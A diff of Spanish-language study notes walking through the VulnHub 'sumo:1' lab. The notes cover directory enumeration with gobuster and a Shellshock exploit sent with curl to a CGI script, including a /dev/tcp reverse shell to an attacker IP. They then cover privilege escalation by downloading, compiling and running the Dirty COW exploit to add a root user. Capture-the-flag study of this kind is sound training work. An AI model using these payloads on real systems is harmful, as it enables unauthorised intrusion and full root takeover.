@@ -1,61 +1,105 @@
-sumo:1 descargar el mirror
+> El kernel (núcleo) es la parte fundamental del sistema operativo, actuando como intermediario entre el software (aplicaciones) y el hardware (CPU, memoria, dispositivos). Gestiona los recursos del sistema, la memoria y la prioridad de los procesos, asegurando que el software acceda al hardware de manera segura y eficiente.
+## Laboratorio
+- Utilizamos una imagen iso de `vulnhub` **sumo:1** 
+- Descargamos el mirror y ejecutamos
+- Descubrimos la ip
+- Puertos abiertos
+- Vamos a explotar primero el laboratorio para despues si escalar privilegios
+- La vulnerabilidad sera [[Shellshock]]
 
-arp-scan --localnet -I ens33 --ignoredups
+```
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/Dirbuster -u http://192.168.111.45 -t 20 --add-slash
+```
+- descubrimos /cgi-bin/
 
-shellshock
+```
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/Dirbuster -u http://192.168.111.45/cgi-bin -t 20 --add-slash -x pl,cgi,sh
+```
+- Descubrimos el recurso http://192.168.111.45/cgi-bin/test.sh
 
-gobuster dir -w /usr/share/seclists/dicovery/swebconte/dire -u http -t 20 --add-slash
+- Explotamos
+```
+curl -s "http://192.168.111.45/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
+```
+- Aplicamos reverse shell
+```
+curl -s "http://192.168.111.45/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.111.46/443 1>&2'"
+```
+- Por el otro lado
+```
+nc -nvlp 443
+```
 
-descubrimos /cgi-bin/
-
-gobuster -u /cgi-bin 0x sh,pl,cgi
-
-http://cgi-bin/test.sh
-
-how attackers are using shellshock
-
-curl -s "http://ip/cgi-bin/test.sh" -H "User;agen () { :; } echo; /usr/bin/whoami"
-
-aplicamos reverse shell
-
-listo 
-
+- Arreglamos la consola
+```
 script /dev/null -c bash
-
-contrl z
+ctrl_z
 stty raw -echo; fg
-export temr-xterm
-exposrt sehll-bash
-stty rwows 44column 22
+export TERM=xterm
+export SHELL=bash
+stty rows 44 columns 22
+```
 
+## Paso a paso
+
+```
 lsb_release -a
-para saber que distribucion tiene especificamente
-searchsploit hernel 3.2
+```
+- Para saber que distribucion tiene especificamente y el kernel
+```
+searchsploit kernel 3.2 
+```
+- Buscamos una forma de explotar ese kernel
 
-dirty cow son script en C, race condition
-es una vulnerabilidad para el kernel de algunas versiones de linux
+- En este caso como es vieja la version es vulnerable a un tipo especifico de ataque **dirty cow** que es un script en C, basado en race condition.
+- Es una vulnerabilidad que sobreescribe en el `/etc/passwd` y crea un usuario root nuevo con una contrasenia a eleccion.
 
-searchsplit dirty cow /etc/passwd 
-ptrace_algo
-
-es un script completo para ejecutar
-
-which gcc para compilar codigo c
-
-altera el /etc/passwd
-para crear un nuevo usuario
-sobre root y te deja elegir una contrasenia incluso
-
-./dirty
-
+```
+searchsplit dirty cow /etc/passwd PTRACE_POKEDATA 
+```
+- Buscamos el exploit especifico
+- Para descargarte el archivo
+```
 searchsploit -m linux/local/40839.c
-para descargarte el archivo
+mv 40839.c dirty.c
+```
 
+- Servimos
+```
 python3 -m http.server 80
-wget ip/40839.c
-
+```
+- Descargamos
+```
+wget 192.168.111.46/dirty.c
+```
+- Nos dice como compilarlo
+```
 cat dirtycow.c | grep gcc
-gcc -pthread dirty.c -p dirty -crypt
+gcc -pthread dirty.c -o dirty -lcrypt
+```
+- Ejecutamos
+```
+./dirty
+```
+- Y listo, si vemos el /etc/passwd veremos el nuevo usuario `firefart` en vez de root
+```
+su firefart
+id
+touch a
+ls -l a
+```
+
+- Hay muchas formas de explotar versiones antiguas de linux pero esta estaba mas enfocada en el kernel.
+- Para ver que contiene un script de searchsploit
+```
+searchsploit -x <numero del script>
+```
+- Esta es una herramienta para enumerar vulnerabilidades del kernel
+```
+les.sh
+```
+
+
 
 
 
